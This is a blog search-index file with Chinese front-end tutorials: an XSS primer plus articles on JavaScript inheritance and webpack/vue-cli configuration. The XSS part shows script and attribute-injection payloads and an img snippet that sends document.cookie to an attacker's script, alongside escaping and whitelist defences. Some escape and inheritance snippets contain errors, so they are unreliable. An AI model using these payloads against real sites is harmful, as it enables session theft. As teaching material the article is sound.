<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[你必须懂的前端安全（一）- XSS]]></title>
    <url>%2F2018%2F03%2F12%2F%E4%BD%A0%E5%BF%85%E9%A1%BB%E6%87%82%E7%9A%84%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89-%20XSS%2F</url>
    <content type="text"><![CDATA[XSS Cross Site Scripting 跨站脚本攻击 什么是跨站脚本攻击？我希望我网站的所有前端逻辑都来自于本站，也就是说只有我自己网站东西才可以在我网站上跑。如果我的网站上运行了不属于自己的恶意脚本，那就产生了跨站脚本攻击。 跨站脚本攻击的原理程序 + 数据 = 结果，但数据中包含一部分程序时，整个业务逻辑其实就改变了。1content 1234content&lt;script&gt;alert(1)&lt;/script&gt; 例如：电商后台中的富文本编辑器本来是供运营人员插入数据的，但被恶意注入了脚本。本来content仅仅是内容，但是现在content变成了一个程序。 跨站脚本攻击能做什么？我们页面中的脚本能做什么？ 页面中的任何数据，脚本都是可以抓取到的。偷取用户的金额，手机号，银行卡号。 获取cookies,造成cookies中敏感信息外泄。偷取用户的cookie状态，攻击者拿到cookie可以做很多恶意操作。 劫持前端逻辑，比如欺骗用户，按钮本意是做A动作，XSS攻击是的做B动作。 发送请求。 案例搜索框插入恶意脚本：123&lt;script&gt;alert(1)&lt;/script&gt; 脚本真的被执行了 植入恶意脚本1234var img = document.createElement(&apos;img&apos;)img.width = 0img.hieght = 0img.src = `某个php脚本？当前的cookie=encodeURIComponent(document.cookie)` 攻击者拿到这个请求，就可以拿到cookie，获取用户登录态，在自己的浏览器操作。 QQ空间 QQ空间可以通过日志插入富文本。 插入script标签，好友浏览我的qq空间，我就可以拿到他们的cookie了。 商城 用户表单填写信息后提交给后台，然后进行处理。 如果用户提交一个脚本，这个脚本就会在工作人员的后台上去运行，可以拿到后台的工作态，通过http的ref头就可以拿到后台的http地址。 有了后台地址，有了cookie，我们就可以进到他们的后台了。 分类按照攻击代码的来源可以分为：反射型和存储型。反射型直接在URL中带有一长串代码，容易被察觉；而存储型攻击是来自于网站的数据的，所以难以被用户察觉。 反射型后台输出数据渲染页面时，需要在页面渲染来自于URL的参数。我将攻击代码直接由URL参数注入，后台会把我的恶意脚本夹带在dom中，浏览器就会去执行。 传播思路：通过短链接掩盖脚本。 存储型攻击存储到数据库，其它用户访问到时，由读取时注入。 富文本 XSS攻击注入点 HTML节点内容如果HTML节点内容是动态生成的，例如评论框的富文本，用户可能向其中写入恶意脚本。 1234这是一个商品&lt;script&gt;alert(1)&lt;/script&gt; HTML属性 1234//后端模板要渲染的content依赖于url中 ?content=aaaa&quot;onerror=&quot;alert(1)&quot;，通过 &quot; 提前关闭了属性框。&lt;img src=&quot;#content&quot;/&gt;// 渲染后的HTML就会被篡改。&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;/&gt; 一些标签的属性被篡改。例如img的src。 JS代码JS渲染页面时，从后台拿数据，后台的数据是从url中取的。JS就会将从url注入的恶意脚本渲染到页面上去。 富文本富文本插入的HTML，是由被攻击的风险的。 浏览器自带防御XSS 浏览器开启了响应头 X-XSS-Protection: 1(默认值)，现代浏览器认为这个页面可能存在了XSS攻击。 原理：url的参数再次出现在HTML的内容或者属性中，浏览器就会拦截。 缺点：富文本，JS渲染这种注入方式，是无法拦截的。 防御措施HTML节点内容1#&#123;content&#125; 对内容进行转义，将html的尖括号“&lt;”和“&gt;”转义掉。你输入什么，我显示什么，不执行。12str.replace(/&lt;/g, &apos;&amp;lt&apos;)str.replace(/&gt;/g, &apos;&amp;gt&apos;) HTML属性1234//后端模板要渲染的content依赖于url中 ?content=aaaa&quot;onerror=&quot;alert(1)&quot;，通过 &quot; 提前关闭了属性框。&lt;img src=&quot;#content&quot;/&gt;// 渲染后的HTML就会被篡改。&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;/&gt; 其实本质是利用”提前关闭了属性，再注入新的属性，解决方式是转义引号单引号也要转义空格也要转义12str.replace(/&quot;/g, &apos;&amp;quto&apos;)str.replace(/&apos;/g, &apos;&amp;#39&apos;) Javascript代码12var data = &apos;#&#123;data&#125;&apos;var data = &quot;hello&quot;; alert(1); &quot;&quot;; 转译数据中的引号1str.replace(/&quot;/g, &apos;\\&quot;&apos;) 富文本黑名单过滤去掉script标签，去掉onerror标签 优点：实现简单 缺点：HTML标签繁杂，容易留下漏洞 白名单过滤只允许指定的标签，以及指定的标签保留指定的属性 优点：不易留下漏洞。 缺点：实现繁杂，要将HTML解析成树，再组装。]]></content>
      <categories>
        <category>web前端安全</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>web前端安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简单说一说JavaScripti的继承]]></title>
    <url>%2F2018%2F03%2F01%2F%E7%AE%80%E5%8D%95%E8%AF%B4%E4%B8%80%E8%AF%B4JavaScript%E7%9A%84%E7%BB%A7%E6%89%BF%2F</url>
    <content type="text"><![CDATA[构造函数实现继承12345678function parent () &#123; this.name = &apos;tom&apos;&#125;function child () &#123; parent.call(this) this.type = &apos;child&apos;&#125; 只能继承父类属性，无法继承父类原型链上的方法和属性 原型链实现继承123456789function parent () &#123; this.name = &apos;tom&apos;&#125;function child () &#123; this.type = &apos;child&apos;&#125;child.prototype = new parent() child的所有实例共用new parent()上的属性和方法，失去继承的意义 组合法实现继承12345678910function parent () &#123; this.name = &apos;tom&apos;&#125;function child () &#123; parent.call(this) this.type = &apos;child&apos;&#125;child.prototype = new parent() 调用了两次构造函数，不科学 组合法实现继承优化112345678910function parent () &#123; this.name = &apos;tom&apos;&#125;function child () &#123; parent.call(this) this.type = &apos;child&apos;&#125;child.prototype = parent.prototype 组合法实现继承优化212345678910function parent () &#123; this.name = &apos;tom&apos;&#125;function child () &#123; parent.call(this) this.type = &apos;child&apos;&#125;child.prototype = Object.create(parent.prototype) instance无法判断child实例是否是child构造函数的实例 组合法实现继承优化312345678910function parent () &#123; this.name = &apos;tom&apos;&#125;function child () &#123; parent.call(this) this.type = &apos;child&apos;&#125;child.constructor = childchild.prototype = Object.create(parent.prototype) instance无法判断child实例是否是child构造函数的实例]]></content>
      <categories>
        <category>JavaScript之美</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（十六）-Webpack的一些面试点]]></title>
    <url>%2F2018%2F02%2F26%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E5%8D%81%E5%85%AD%EF%BC%89-Webpack%E7%9A%84%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E7%82%B9%2F</url>
    <content type="text"><![CDATA[WebPack面试点 概念 配置 开发环境 优化 概念什么是webpack?和grunt和gulp有什么不同？ Webpack是一个模块打包器，他可以递归的打包项目中的所有模块，最终生成几个打包后的文件。Webpack配置文件一般会提供打包的入口，入口文件会包含其它的依赖。所以，Webpack会分析这种依赖，递归的去打包这些依赖，最终生成几个打包后的文件。 它和其它的工具最大的不同在于他支持code-splitting（代码分割）、支持模块化开发（AMD、ESM、CommonJS）、全局分析（分析整个项目下，与你应用相关的模块）。 什么是bundle，什么是chunk，什么module？bundle是由webpack最终打包出来的文件，chunk是指webpack在进行模块的依赖分析的时候，代码分割出来的代码块。module是开发中的单个模块。 什么是loader，什么是plugin？ Loaders是用来告诉webpack如何转化处理某一类型的文件，并且引入到打包出来的文件中。Loader是针对文件的。 plugin是用来自定义webpack打包过程的方式，一个插件是含有apply方法的对象，通过这个方法可以参与到整个webpack打包的各个流程（生命周期）。使用plugin可以参与到webpack整个打包的生命周期中。 配置如何可以自动生成webpack配置？webpack-cli/vue-cli等脚手架工具 开发webpack-dev-server和http服务器如nginx有什么区别？ webpack-dev-server = express + webpack-moddle-ware + 配置 webpack-dev-server使用内存来存储webpack开发环境下的打包文件，并且可以使用模块热更新，他比传统的http服务队开发更加简单高效。 什么是模块热更新？ 模块热更新是webpack的一个功能，它可以使得代码修改过后不用刷新浏览器就可以更新，是高级版的自动刷新浏览器。 相比于刷新浏览器，模块热更新不会使我们丢失当前的状态。 原理：websocket的推送配合我们代码中存在的回调，重新执行这一部分代码。 优化什么是长缓存？在webpack中如何做到长缓存优化？ 浏览器在用户访问页面的时候，为了加快加载速度，会对用户访问的静态资源进行存储，但是每一次代码升级或是更新，都需要浏览器取下载新的代码，最方便和简单的更新方式就是引入新的文件名称。 在webpack中可以在output给输出的文件执行chunkhash，并且分离经常更新的代码和框架代码。通过NamedModulesPlugin伙食HashedModuleIdsPlugin使再次打包文件名不变。 什么是Tree-shaking？css可以Tree-shaking吗？ Tree-shaking是指在打包中去除那些引入了，但是在代码中没有被用到的那些死代码。 在webpack中Tree-shaking是通过uglifyJSPlugin来Tree-shaking JS。CSS需要使用Purify-CSS。 工程化总结特点 实时编译 完整提供了开发服务 网页的优化溶解在了工具中 一切皆模块 急速的调试响应速度 优化应该交给工具自动完成 未来 零配置？更快的打包速度，更小的打包结果？平行处理（多线程）？ webpack4中将去除CommonChunkPlugin，将改为optimize下的一个插件。 支持格式越来越多。 breaking change]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（十五）-基于Webpack的脚手架vue-cli]]></title>
    <url>%2F2018%2F02%2F22%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E5%8D%81%E4%BA%94%EF%BC%89-%E5%9F%BA%E4%BA%8EWebpack%E7%9A%84%E8%84%9A%E6%89%8B%E6%9E%B6vue-cli%2F</url>
    <content type="text"><![CDATA[vue-cli中webpack的相关目录结构- build:webpack打包相关配置 config:webpack打包的一些参数 vue-cli webpack相关配置webpack.base.conf.js 概述 主要是4部分 配置 1234const path = require(&apos;path&apos;)const utils = require(&apos;./utils&apos;)const config = require(&apos;../config&apos;)const vueLoaderConfig = require(&apos;./vue-loader.conf&apos;) 生成路径函数该函数将所有的路径都先指向根目录，再以根目录为准指向别的目录 1function resolve(dir) &#123;&#125; 创建eslint的loader 1const createLintingRule = function &#123;&#125; 整体的基础配置module.exports = {}这个整体的基础配置是供webpack.dev.conf.js以及webpack.prod.conf.js使用 utils.js讲解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114&apos;use strict&apos;const path = require(&apos;path&apos;)const config = require(&apos;../config&apos;)const ExtractTextPlugin = require(&apos;extract-text-webpack-plugin&apos;)const packageConfig = require(&apos;../package.json&apos;)exports.assetsPath = function (_path) &#123; const assetsSubDirectory = process.env.NODE_ENV === &apos;production&apos; // 如果是生产环境，根据生产环境下的目录指定 ? config.build.assetsSubDirectory // 如果是开发环境，根据开发环境下的目录指定 : config.dev.assetsSubDirectory // path.posix node为跨平台准备的 return path.posix.join(assetsSubDirectory, _path)&#125;// vue-cli如何帮助我们生成相关的loader的exports.cssLoaders = function (options) &#123; options = options || &#123;&#125; const cssLoader = &#123; loader: &apos;css-loader&apos;, options: &#123; sourceMap: options.sourceMap &#125; &#125; // const postcssLoader = &#123; loader: &apos;postcss-loader&apos;, options: &#123; sourceMap: options.sourceMap &#125; &#125; // generate loader string to be used with extract text plugin function generateLoaders (loader, loaderOptions) &#123; // options.usePostCSS 这里会接收webpack.dev 或 webpack.prod 中调用时，传入的参数 const loaders = options.usePostCSS ? [cssLoader, postcssLoader] : [cssLoader] if (loader) &#123; loaders.push(&#123; loader: loader + &apos;-loader&apos;, options: Object.assign(&#123;&#125;, loaderOptions, &#123; sourceMap: options.sourceMap &#125;) &#125;) &#125; // Extract CSS when that option is specified // (which is the case during production build) // 是否从我们的代码中抽取我们的css if (options.extract) &#123; return ExtractTextPlugin.extract(&#123; use: loaders, // 处理样式的loader，最终是vue-style-loader fallback: &apos;vue-style-loader&apos; &#125;) // 不使用ExtractTextPlugin，便使用vue-style-loader &#125; else &#123; return [&apos;vue-style-loader&apos;].concat(loaders) &#125; &#125; // https://vue-loader.vuejs.org/en/configurations/extract-css.html return &#123; css: generateLoaders(), postcss: generateLoaders(), // 添加key，会添加新的loader // 不添加key，不添加新的loader less: generateLoaders(&apos;less&apos;), sass: generateLoaders(&apos;sass&apos;, &#123; indentedSyntax: true &#125;), scss: generateLoaders(&apos;sass&apos;), stylus: generateLoaders(&apos;stylus&apos;), styl: generateLoaders(&apos;stylus&apos;) &#125;&#125;// Generate loaders for standalone style files (outside of .vue)exports.styleLoaders = function (options) &#123; const output = [] // 拿到cssLoaders为我们生产的loader以后 const loaders = exports.cssLoaders(options) for (const extension in loaders) &#123; const loader = loaders[extension] output.push(&#123; test: new RegExp(&apos;\\.&apos; + extension + &apos;$&apos;), use: loader &#125;) &#125; // 返回配置，并在merge时，合成一个完整的相关配置 return output&#125;exports.createNotifierCallback = () =&gt; &#123; const notifier = require(&apos;node-notifier&apos;) return (severity, errors) =&gt; &#123; if (severity !== &apos;error&apos;) return const error = errors[0] const filename = error.file &amp;&amp; error.file.split(&apos;!&apos;).pop() notifier.notify(&#123; title: packageConfig.name, message: severity + &apos;: &apos; + error.name, subtitle: filename || &apos;&apos;, icon: path.join(__dirname, &apos;logo.png&apos;) &#125;) &#125;&#125; vue-loader.conf.js讲解 一个vue单文件组件由3部分组成，以.vue结尾的文件给vue-loader处理 所以 vue-loader 要将这3种文件拆分出来给到正确的3种loader去处理1234567891011121314151617181920212223242526&apos;use strict&apos;const utils = require(&apos;./utils&apos;)const config = require(&apos;../config&apos;)const isProduction = process.env.NODE_ENV === &apos;production&apos;const sourceMapEnabled = isProduction ? config.build.productionSourceMap : config.dev.cssSourceMapmodule.exports = &#123; // 这里配置css-loader的相关内容 // 这里引出了utils怎么为我们生成css-loader loaders: utils.cssLoaders(&#123; sourceMap: sourceMapEnabled, extract: isProduction &#125;), cssSourceMap: sourceMapEnabled, cacheBusting: config.dev.cacheBusting, // 在html中引入链接不被webpack处理，在vue中的tempalte也存在这个问题 // vue-loader的这个配置，帮助template模板中的链接转为require，webpack就能处理了 transformToRequire: &#123; video: [&apos;src&apos;, &apos;poster&apos;], source: &apos;src&apos;, img: &apos;src&apos;, image: &apos;xlink:href&apos; &#125;&#125; webpack.base.conf.js 详解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990// 告诉webpack项目运行环境,这里指向根目录context: path.resolve(__dirname, &apos;../&apos;),// 项目中如果有多个entry，可以在此修改，来增加我们的入口entry: &#123; app: &apos;./src/main.js&apos;&#125;// 这里的output是dev环境下使用的// webpack.prod.conf.js中也有一个output，在merge后，可以覆盖掉这个配置output: &#123; // 这里path、publicPath，都是来自于config的变量。config目录下的index.js会输出两个对象：dev、build。 path: config.build.assetsRoot, filename: &apos;[name].js&apos;, // publicPath，发布以后，嵌入到html中路径是什么，一般是cdn的域名 publicPath: process.env.NODE_ENV === &apos;production&apos; // 是生产环境，则是config.build.assetsPublicPath ? config.build.assetsPublicPath // 是开发环境，则是config.dev.assetsPublicPath : config.dev.assetsPublicPath&#125;,// 定义了别名// extensions，这三个后缀名，你在vue-cli开发中，不需要再去写后缀名// alias，定义了一些别名resolve: &#123; extensions: [&apos;.js&apos;, &apos;.vue&apos;, &apos;.json&apos;], alias: &#123; &apos;@&apos;: resolve(&apos;src&apos;), &#125;&#125;,// 定义了大量loadermodule: &#123; rules: [ // 如果开发环境中使用的eslint，config.dev.useEslint就会设为tre，就会加入eslint的loader ...(config.dev.useEslint ? [createLintingRule()] : []), &#123; test: /\.vue$/, loader: &apos;vue-loader&apos;, // 这里会引出vue-loader-config中的一些配置,见上文 options: vueLoaderConfig &#125;, &#123; test: /\.js$/, loader: &apos;babel-loader&apos;, // 这里是可以优化的，这里对环境参数做区分，bable-loader在生产环境下不对test和client做编译 include: [resolve(&apos;src&apos;), resolve(&apos;test&apos;), resolve(&apos;node_modules/webpack-dev-server/client&apos;)] &#125;, &#123; test: /\.(png|jpe?g|gif|svg)(\?.*)?$/, loader: &apos;url-loader&apos;, options: &#123; limit: 10000, // utils.assetsPath 函数 // 指定路径 name: utils.assetsPath(&apos;img/[name].[hash:7].[ext]&apos;) &#125; &#125;, &#123; test: /\.(mp4|webm|ogg|mp3|wav|flac|aac)(\?.*)?$/, loader: &apos;url-loader&apos;, options: &#123; limit: 10000, name: utils.assetsPath(&apos;media/[name].[hash:7].[ext]&apos;) &#125; &#125;, &#123; test: /\.(woff2?|eot|ttf|otf)(\?.*)?$/, loader: &apos;url-loader&apos;, options: &#123; limit: 10000, name: utils.assetsPath(&apos;fonts/[name].[hash:7].[ext]&apos;) &#125; &#125; ]&#125;,// 是否将node的api注入到我们的代码中node: &#123; // prevent webpack from injecting useless setImmediate polyfill because Vue // source contains it (although only uses it if it&apos;s native). setImmediate: false, // prevent webpack from injecting mocks to Node native modules // that does not make sense for the client dgram: &apos;empty&apos;, fs: &apos;empty&apos;, net: &apos;empty&apos;, tls: &apos;empty&apos;, child_process: &apos;empty&apos;&#125; webpack.dev.conf.js 详解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&apos;use strict&apos;const utils = require(&apos;./utils&apos;)const webpack = require(&apos;webpack&apos;)const config = require(&apos;../config&apos;)const merge = require(&apos;webpack-merge&apos;)const path = require(&apos;path&apos;)const baseWebpackConfig = require(&apos;./webpack.base.conf&apos;)const CopyWebpackPlugin = require(&apos;copy-webpack-plugin&apos;)const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;)const FriendlyErrorsPlugin = require(&apos;friendly-errors-webpack-plugin&apos;)const portfinder = require(&apos;portfinder&apos;)const HOST = process.env.HOSTconst PORT = process.env.PORT &amp;&amp; Number(process.env.PORT)// 为开发环境提供的配置// baseWebpackConfig是webpack.base.confconst devWebpackConfig = merge(baseWebpackConfig, &#123; module: &#123; // 生成loaders，设置usePostCSS为true rules: utils.styleLoaders(&#123; sourceMap: config.dev.cssSourceMap, usePostCSS: true &#125;) &#125;, // cheap-module-eval-source-map is faster for development devtool: config.dev.devtool, // devServer的配置 // these devServer options should be customized in /config/index.js devServer: &#123; clientLogLevel: &apos;warning&apos;, historyApiFallback: &#123; rewrites: [ &#123; from: /.*/, to: path.posix.join(config.dev.assetsPublicPath, &apos;index.html&apos;) &#125;, ], &#125;, hot: true, contentBase: false, // since we use CopyWebpackPlugin. compress: true, host: HOST || config.dev.host, port: PORT || config.dev.port, open: config.dev.autoOpenBrowser, overlay: config.dev.errorOverlay ? &#123; warnings: false, errors: true &#125; : false, publicPath: config.dev.assetsPublicPath, proxy: config.dev.proxyTable, // devServer不要输出信息 quiet: true, // necessary for FriendlyErrorsPlugin watchOptions: &#123; // 轮询 poll: config.dev.poll, &#125; &#125;, plugins: [ // 定义环境变量 new webpack.DefinePlugin(&#123; &apos;process.env&apos;: require(&apos;../config/dev.env&apos;) &#125;), new webpack.HotModuleReplacementPlugin(), new webpack.NamedModulesPlugin(), // HMR shows correct file names in console on update. new webpack.NoEmitOnErrorsPlugin(), // https://github.com/ampedandwired/html-webpack-plugin new HtmlWebpackPlugin(&#123; filename: &apos;index.html&apos;, template: &apos;index.html&apos;, inject: true &#125;), // 帮助我们将static目录直接拷贝到要输出的目录下 // copy custom static assets new CopyWebpackPlugin([ &#123; from: path.resolve(__dirname, &apos;../static&apos;), to: config.dev.assetsSubDirectory, ignore: [&apos;.*&apos;] &#125; ]) ]&#125;)module.exports = new Promise((resolve, reject) =&gt; &#123; // portfinder 检查端口是否占用 portfinder.basePort = process.env.PORT || config.dev.port portfinder.getPort((err, port) =&gt; &#123; if (err) &#123; reject(err) &#125; else &#123; // publish the new Port, necessary for e2e tests process.env.PORT = port // add port to devServer config devWebpackConfig.devServer.port = port // Add FriendlyErrorsPlugin devWebpackConfig.plugins.push(new FriendlyErrorsPlugin(&#123; compilationSuccessInfo: &#123; messages: [`Your application is running here: http://$&#123;devWebpackConfig.devServer.host&#125;:$&#123;port&#125;`], &#125;, onErrors: config.dev.notifyOnErrors ? utils.createNotifierCallback() : undefined &#125;)) resolve(devWebpackConfig) &#125; &#125;)&#125;) webpack.prod.conf.js 详解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165&apos;use strict&apos;const path = require(&apos;path&apos;)const utils = require(&apos;./utils&apos;)const webpack = require(&apos;webpack&apos;)const config = require(&apos;../config&apos;)const merge = require(&apos;webpack-merge&apos;)const baseWebpackConfig = require(&apos;./webpack.base.conf&apos;)const CopyWebpackPlugin = require(&apos;copy-webpack-plugin&apos;)const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;)const ExtractTextPlugin = require(&apos;extract-text-webpack-plugin&apos;)const OptimizeCSSPlugin = require(&apos;optimize-css-assets-webpack-plugin&apos;)const UglifyJsPlugin = require(&apos;uglifyjs-webpack-plugin&apos;)const Happypack = require(&apos;happypack&apos;)const env = require(&apos;../config/prod.env&apos;)const webpackConfig = merge(baseWebpackConfig, &#123; module: &#123; rules: utils.styleLoaders(&#123; sourceMap: config.build.productionSourceMap, extract: true, usePostCSS: true &#125;) &#125;, devtool: config.build.productionSourceMap ? config.build.devtool : false, // 这里的output会覆盖原有的output output: &#123; path: config.build.assetsRoot, filename: utils.assetsPath(&apos;js/[name].[chunkhash].js&apos;), chunkFilename: utils.assetsPath(&apos;js/[id].[chunkhash].js&apos;) &#125;, plugins: [ new Happypack(&#123; id: &apos;vue&apos;, loader: [&#123; loader: &apos;vue-loader&apos;, option: require(&apos;./vue-loader.conf&apos;) &#125;] &#125;), new webpack.DllReferencePlugin(&#123; manifest: require(&apos;../src/dll/ui-manifest.json&apos;) &#125;), new webpack.DllReferencePlugin(&#123; manifest: require(&apos;../src/dll/vue-manifest.json&apos;) &#125;), // http://vuejs.github.io/vue-loader/en/workflow/production.html new webpack.DefinePlugin(&#123; &apos;process.env&apos;: env &#125;), // vue-cli也只在生产环境下使用了UglifyJsPlugin new UglifyJsPlugin(&#123; uglifyOptions: &#123; compress: &#123; warnings: false &#125; &#125;, sourceMap: config.build.productionSourceMap, parallel: true, cache: true &#125;), // extract css into its own file new ExtractTextPlugin(&#123; filename: utils.assetsPath(&apos;css/[name].[contenthash].css&apos;), // Setting the following option to `false` will not extract CSS from codesplit chunks. // Their CSS will instead be inserted dynamically with style-loader when the codesplit chunk has been loaded by webpack. // It&apos;s currently set to `true` because we are seeing that sourcemaps are included in the codesplit bundle as well when it&apos;s `false`, // increasing file size: https://github.com/vuejs-templates/webpack/issues/1110 // 无论动静加载的js，都会提出 allChunks: true, &#125;), // Compress extracted CSS. We are using this plugin so that possible // duplicated CSS from different components can be deduped. new OptimizeCSSPlugin(&#123; cssProcessorOptions: config.build.productionSourceMap ? &#123; safe: true, map: &#123; inline: false &#125; &#125; : &#123; safe: true &#125; &#125;), // generate dist index.html with correct asset hash for caching. // you can customize output by editing /index.html // see https://github.com/ampedandwired/html-webpack-plugin new HtmlWebpackPlugin(&#123; filename: config.build.index, template: &apos;index.html&apos;, inject: true, minify: &#123; removeComments: true, collapseWhitespace: true, removeAttributeQuotes: true // more options: // https://github.com/kangax/html-minifier#options-quick-reference &#125;, // necessary to consistently work with multiple chunks via CommonsChunkPlugin chunksSortMode: &apos;dependency&apos; &#125;), // keep module.id stable when vendor modules does not change new webpack.HashedModuleIdsPlugin(), // enable scope hoisting // 作用域提升，打包出来的代码速度可以提高 new webpack.optimize.ModuleConcatenationPlugin(), // split vendor js into its own file new webpack.optimize.CommonsChunkPlugin(&#123; name: &apos;vendor&apos;, minChunks (module) &#123; // any required modules inside node_modules are extracted to vendor return ( module.resource &amp;&amp; /\.js$/.test(module.resource) &amp;&amp; module.resource.indexOf( path.join(__dirname, &apos;../node_modules&apos;) ) === 0 ) &#125; &#125;), // extract webpack runtime and module manifest to its own file in order to // prevent vendor hash from being updated whenever app bundle is updated new webpack.optimize.CommonsChunkPlugin(&#123; name: &apos;manifest&apos;, minChunks: Infinity &#125;), // This instance extracts shared chunks from code splitted chunks and bundles them // in a separate chunk, similar to the vendor chunk // see: https://webpack.js.org/plugins/commons-chunk-plugin/#extra-async-commons-chunk // 使用动态的vendor-async new webpack.optimize.CommonsChunkPlugin(&#123; name: &apos;app&apos;, async: &apos;vendor-async&apos;, children: true, minChunks: 3 &#125;), // copy custom static assets new CopyWebpackPlugin([ &#123; from: path.resolve(__dirname, &apos;../static&apos;), to: config.build.assetsSubDirectory, ignore: [&apos;.*&apos;] &#125; ]) ]&#125;)if (config.build.productionGzip) &#123; const CompressionWebpackPlugin = require(&apos;compression-webpack-plugin&apos;) webpackConfig.plugins.push( new CompressionWebpackPlugin(&#123; asset: &apos;[path].gz[query]&apos;, algorithm: &apos;gzip&apos;, test: new RegExp( &apos;\\.(&apos; + config.build.productionGzipExtensions.join(&apos;|&apos;) + &apos;)$&apos; ), threshold: 10240, minRatio: 0.8 &#125;) )&#125;if (config.build.bundleAnalyzerReport) &#123; const BundleAnalyzerPlugin = require(&apos;webpack-bundle-analyzer&apos;).BundleAnalyzerPlugin webpackConfig.plugins.push(new BundleAnalyzerPlugin())&#125;module.exports = webpackConfig]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（十四）-Webpack开发多页面应用]]></title>
    <url>%2F2018%2F02%2F22%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89-Webpack%E5%BC%80%E5%8F%91%E5%A4%9A%E9%A1%B5%E9%9D%A2%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[多页面应用的特点 多入口、多页面之间公用框架入口 多页面，多个html 每个页面会产生不同的chunk 每个页面会有不同的参数 实现多页面应用的方式多配置：每个页面对应一份配置 webpack 3.1 支持多配置打包方式，但是串行处理 parallel-webpack，并行的处理多份配置 多配置优点 可使用parallel-webpack 来提高打包的速度 各个页面之间的配置更加独立、灵活 多配置缺点 因为多页面之间配置是相互独立的，所以webpack不能分析它们共享的代码。即多配置是不可多页面之间共享代码的。 所以多页面之间不能共享代码，就不能对公共代码进行常规优化 parallel-webpack使用与官网webpack类似 单配置：多个页面共享一份配置单配置优点： 可以共享多个entry之间的公用代码。 单配置缺点： webpack分析多页面代码之间的相互依赖关系会慢 打包看到的结果是多页面的，所以输出的内容也会十分复杂。 代码实战目录结构 根目录：src、package.json、webpack.conf.js src：components、css、pages components：module.js css：a.css、b.css、c.css pages（多页面）： a.js、b.js、c.js 安装依赖 webpack-merge webpack html-webpack-plugin clean-webpack-plugin extract-text-webpack-plugin 多页面多配置 webpack.conf.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107const merge = require(&apos;webpack-merge&apos;)const webpack = require(&apos;webpack&apos;)const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;)const CleanWebpack = require(&apos;clean-webpack-plugin&apos;)const ExtractTextWebpackPlugin = require(&apos;extract-text-webpack-plugin&apos;)const path = require(&apos;path&apos;)// 基本公共配置const baseConfig = &#123; entry: &#123; react: &apos;react&apos; &#125;, output: &#123; path: path.resolve(__dirname, &apos;dist&apos;), filename: &apos;js/[name].[chunkhash].js&apos; &#125;, module: &#123; rules: [ &#123; test: /\.css$/, use: ExtractTextWebpackPlugin.extract(&#123; fallback: &apos;style-loader&apos;, use: &apos;css-loader&apos; &#125;) &#125; ] &#125;, plugins: [ new ExtractTextWebpack(&#123; filename: &apos;css/[name].[hash].css&apos; &#125;), new CleanWebpack(path.resolve(__dirname, &apos;dist&apos;)), new webpack.optimize.CommonsChunkPlugin(&#123; name: &apos;react&apos;, minChunks: Infinity &#125;) ]&#125;// 定义函数，帮助我们生成每一个页面（入口）的配置const generatePage = function (&#123; title = &apos;&apos;, entry = &apos;&apos;, template = &apos;./src/index.html&apos;, name = &apos;&apos;, chunks = []&#125; = &#123;&#125;) &#123; // 返回配置 return &#123; entry, plugins: [ new HtmlWebpackPlugin(&#123; chunks, // 生成html的模板 template, title, // 我们要生成页面的名称 filename: name + &apos;.html&apos; &#125;) ] &#125;&#125;const pages = [ generatePage(&#123; title: &apos;page A&apos;, entry: &#123; a: &apos;./src/pages/a&apos; &#125;, name: &apos;a&apos;, // 多页面应用程序，chunks是 公用代码 + 自己本身的chunk // react是公用的, a是自己本身的 chunks: [&apos;react&apos;, &apos;a&apos;] &#125;), generatePage(&#123; title: &apos;page B&apos;, entry: &#123; b: &apos;./src/pages/b&apos; &#125;, name: &apos;b&apos;, // 多页面应用程序，chunks是 公用代码 + 自己本身的chunk // react是公用的, a是自己本身的 chunks: [&apos;react&apos;, &apos;b&apos;] &#125;), generatePage(&#123; title: &apos;page C&apos;, entry: &#123; c: &apos;./src/pages/c&apos; &#125;, name: &apos;c&apos;, // 多页面应用程序，chunks是 公用代码 + 自己本身的chunk // react是公用的 chunks: [&apos;react&apos;, &apos;c&apos;] &#125;),]// 和基础配置merge，生成最终配置// 多页面多配置，向外暴露一个数组，数组里包含多配置// 这样会生成一个数组，数组中有三份配置module.exports = pages.map(page =&gt; merge(baseConfig, page)) 这样打包出的结果也有三份 采用parallel-webpack并行加快我们的打包速度。直接 npx parallel-webpack 